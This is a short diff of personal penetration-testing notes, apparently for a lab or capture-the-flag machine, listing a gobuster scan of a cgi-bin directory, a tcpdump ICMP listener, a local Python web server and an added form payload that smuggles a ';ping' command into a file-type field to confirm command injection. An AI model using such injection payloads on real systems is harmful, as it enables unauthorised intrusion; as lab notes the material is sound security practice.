@@ -17,6 +17,9 @@ sprawdzaj lokalizacje cgi-bin
 gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/big.txt  -x sh, cgi, pl
 
 
+sudo tcpdump -ni tun0 icmp
+photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg;ping+10.10.14.5&dimensions=30x20
+
 https://www.exploit-db.com
 
 python3 -m http.server 80
